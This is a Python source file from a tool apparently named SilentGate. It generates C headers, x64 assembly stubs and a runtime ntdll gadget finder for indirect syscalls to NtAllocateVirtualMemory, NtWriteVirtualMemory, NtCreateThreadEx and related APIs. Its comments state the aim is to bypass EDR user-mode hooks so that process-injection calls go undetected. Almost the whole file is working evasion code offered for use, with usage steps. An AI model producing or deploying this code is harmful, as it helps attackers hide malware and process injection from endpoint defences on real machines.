"""
SilentGate - core/stub_generator.py
Step 3 of the pipeline: C and ASM Stub Generator

Author  : JarDani
License : MIT
Purpose : Generates indirect syscall stubs in C and ASM format
          using the SSN resolved by ssn_resolver.py.
          Output files are ready to compile with MinGW on Windows.
"""

import os
import json

OUTPUT_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "output"
)

# Function signatures for all 5 supported APIs
API_SIGNATURES = {
    "NtAllocateVirtualMemory": {
        "return_type": "NTSTATUS",
        "params": [
            ("HANDLE",    "ProcessHandle"),
            ("PVOID*",    "BaseAddress"),
            ("ULONG_PTR", "ZeroBits"),
            ("PSIZE_T",   "RegionSize"),
            ("ULONG",     "AllocationType"),
            ("ULONG",     "Protect")
        ]
    },
    "NtWriteVirtualMemory": {
        "return_type": "NTSTATUS",
        "params": [
            ("HANDLE",  "ProcessHandle"),
            ("PVOID",   "BaseAddress"),
            ("PVOID",   "Buffer"),
            ("SIZE_T",  "NumberOfBytesToWrite"),
            ("PSIZE_T", "NumberOfBytesWritten")
        ]
    },
    "NtProtectVirtualMemory": {
        "return_type": "NTSTATUS",
        "params": [
            ("HANDLE", "ProcessHandle"),
            ("PVOID*", "BaseAddress"),
            ("PSIZE_T","RegionSize"),
            ("ULONG",  "NewProtect"),
            ("PULONG", "OldProtect")
        ]
    },
    "NtCreateThreadEx": {
        "return_type": "NTSTATUS",
        "params": [
            ("PHANDLE",             "ThreadHandle"),
            ("ACCESS_MASK",         "DesiredAccess"),
            ("POBJECT_ATTRIBUTES",  "ObjectAttributes"),
            ("HANDLE",              "ProcessHandle"),
            ("PVOID",               "StartRoutine"),
            ("PVOID",               "Argument"),
            ("ULONG",               "CreateFlags"),
            ("SIZE_T",              "ZeroBits"),
            ("SIZE_T",              "StackSize"),
            ("SIZE_T",              "MaximumStackSize"),
            ("PVOID",               "AttributeList")
        ]
    },
    "NtOpenProcess": {
        "return_type": "NTSTATUS",
        "params": [
            ("PHANDLE",            "ProcessHandle"),
            ("ACCESS_MASK",        "DesiredAccess"),
            ("POBJECT_ATTRIBUTES", "ObjectAttributes"),
            ("PCLIENT_ID",         "ClientId")
        ]
    }
}


def generate_c_stub(api_name, ssn, ssn_hex):
    """
    Generate the C header stub for the given API.
    This declares the external ASM function that the
    red teamer calls instead of the real hooked API.
    """
    sig = API_SIGNATURES[api_name]
    return_type = sig["return_type"]
    params = sig["params"]

    # Build parameter string
    param_lines = []
    for ptype, pname in params:
        param_lines.append(f"    {ptype:<16} {pname}")
    param_str = ",\n".join(param_lines)

    c_code = f"""/*
 * SilentGate - Indirect Syscall Stub
 * ===================================
 * API    : {api_name}
 * SSN    : {ssn} ({ssn_hex})
 * Author : JarDani
 * License: MIT
 *
 * USAGE:
 *   Include this file in your project.
 *   Call SG_{api_name}() instead of {api_name}().
 *   The stub invokes the syscall indirectly via a clean
 *   ntdll gadget — bypassing EDR user-mode hooks.
 *
 * HOW IT WORKS:
 *   1. SSN {ssn} is loaded into EAX
 *   2. Execution jumps into a clean ntdll syscall stub
 *   3. The syscall instruction executes from ntdll address space
 *   4. EDR sees the call originating from trusted ntdll code
 *   5. The hook on {api_name} is never triggered
 *
 * MITRE ATT&CK: T1055 - Process Injection / T1106 - Native API
 */

#pragma once
#include <windows.h>
#include <winternl.h>

/* Forward declaration of the ASM stub */
extern {return_type} SG_{api_name}(
{param_str}
);

/*
 * Example usage:
 *
 *   PVOID  base = NULL;
 *   SIZE_T size = 4096;
 *
 *   NTSTATUS status = SG_{api_name}(
 *       GetCurrentProcess(),
 *       &base,
 *       0,
 *       &size,
 *       MEM_COMMIT | MEM_RESERVE,
 *       PAGE_READWRITE
 *   );
 *
 *   if (NT_SUCCESS(status)) {{
 *       // memory allocated without triggering EDR hook
 *   }}
 */
"""
    return c_code


def generate_asm_stub(api_name, ssn, ssn_hex):
    """
    Generate the x64 MASM stub for the given API.

    The indirect jump technique:
      Instead of syscall executing from our code (detectable),
      we jump into a clean syscall instruction inside ntdll.dll.
      The EDR sees the syscall originating from ntdll — trusted.

    Assembly breakdown:
      mov r10, rcx   - Windows x64 calling convention requirement
                       rcx holds first argument, r10 must mirror it
      mov eax, SSN   - Load the Syscall Service Number
      jmp [gadget]   - Jump into clean ntdll syscall stub
    """
    ssn_asm = ssn_hex.replace("0x", "") + "h"

    asm_code = f"""; ===========================================================
; SilentGate - Indirect Syscall Stub (x64 MASM)
; ===========================================================
; API    : {api_name}
; SSN    : {ssn} ({ssn_hex})
; Author : JarDani
; License: MIT
;
; HOW THIS WORKS:
;   Normal call path (EDR catches this):
;     Your code -> {api_name} in ntdll -> [EDR HOOK] -> kernel
;
;   Indirect syscall path (EDR misses this):
;     Your code -> SG_{api_name} -> loads SSN -> jumps into
;     clean ntdll stub -> syscall executes from ntdll space -> kernel
;
;   The EDR hook sits at the START of {api_name} in ntdll.
;   We never touch that hooked address.
;   We jump PAST the hook into a clean syscall gadget in ntdll.
; ===========================================================

.code

EXTERN SG_{api_name}_addr:QWORD  ; address of clean ntdll gadget

SG_{api_name} PROC
    mov r10, rcx          ; mirror rcx into r10 (Windows x64 ABI)
    mov eax, {ssn_asm}    ; load SSN {ssn} into eax
    jmp QWORD PTR [SG_{api_name}_addr]  ; indirect jump to clean ntdll stub
SG_{api_name} ENDP

END
"""
    return asm_code


def generate_gadget_finder(api_name):
    """
    Generate C code that finds the clean syscall gadget in ntdll
    at runtime. This is what sets SG_{api_name}_addr before use.

    The gadget finder:
      1. Gets the base address of ntdll in memory
      2. Parses the export table to find {api_name}
      3. Scans forward from the function start
      4. Finds the syscall + ret instruction pair (0F 05 C3)
      5. Stores that address in SG_{api_name}_addr
    """
    c_code = f"""/*
 * SilentGate - Gadget Finder
 * ==========================
 * Locates the clean syscall gadget in ntdll at runtime.
 * Call this ONCE before using SG_{api_name}().
 */

#include <windows.h>

QWORD SG_{api_name}_addr = 0;

BOOL SG_Init_{api_name}() {{
    /* Step 1 - Get ntdll base address */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    /* Step 2 - Find the function in ntdll exports */
    FARPROC func = GetProcAddress(ntdll, "{api_name}");
    if (!func) return FALSE;

    /* Step 3 - Scan for syscall + ret (0F 05 C3) */
    BYTE* ptr = (BYTE*)func;
    for (int i = 0; i < 32; i++) {{
        if (ptr[i] == 0x0F && ptr[i+1] == 0x05 && ptr[i+2] == 0xC3) {{
            /* Found clean syscall gadget */
            SG_{api_name}_addr = (QWORD)(ptr + i);
            return TRUE;
        }}
    }}

    return FALSE;  /* gadget not found */
}}
"""
    return c_code


def write_output(filename, content):
    """Write generated content to the output directory."""
    os.makedirs(OUTPUT_PATH, exist_ok=True)
    filepath = os.path.join(OUTPUT_PATH, filename)
    with open(filepath, "w") as f:
        f.write(content)
    return filepath


def generate_stub(api_name, ssn_result, explain=False):
    """
    Main function - generates all stub files for the given API.
    Returns paths to all generated files.
    """
    api  = ssn_result["api_name"]
    ssn  = ssn_result["ssn"]
    ssn_hex = ssn_result["ssn_hex"]

    if explain:
        print(f"\n  [STUB GENERATOR] Generating stubs for: {api}")
        print(f"  [STUB GENERATOR] SSN: {ssn} ({ssn_hex})")
        print(f"  [STUB GENERATOR] Architecture: x64")

    # Generate all three components
    c_stub      = generate_c_stub(api, ssn, ssn_hex)
    asm_stub    = generate_asm_stub(api, ssn, ssn_hex)
    gadget_code = generate_gadget_finder(api)

    # Write to output directory
    c_path      = write_output(f"stub_{api}.h", c_stub)
    asm_path    = write_output(f"stub_{api}.asm", asm_stub)
    gadget_path = write_output(f"gadget_{api}.c", gadget_code)

    if explain:
        print(f"\n  [STUB GENERATOR] Files generated:")
        print(f"    {c_path}")
        print(f"    {asm_path}")
        print(f"    {gadget_path}")
        print(f"\n  [STUB GENERATOR] What was generated:")
        print(f"    C header  : declares SG_{api}() for use in your project")
        print(f"    ASM stub  : loads SSN {ssn} and jumps to clean ntdll gadget")
        print(f"    Gadget    : runtime finder for clean syscall address in ntdll")
        print(f"\n  [STUB GENERATOR] How to use:")
        print(f"    1. Include stub_{api}.h in your project")
        print(f"    2. Call SG_Init_{api}() once at startup")
        print(f"    3. Call SG_{api}() wherever you need it")
        print(f"    4. EDR hook on {api} is never triggered")

    return {
        "api_name":    api,
        "ssn":         ssn,
        "ssn_hex":     ssn_hex,
        "c_path":      c_path,
        "asm_path":    asm_path,
        "gadget_path": gadget_path
    }
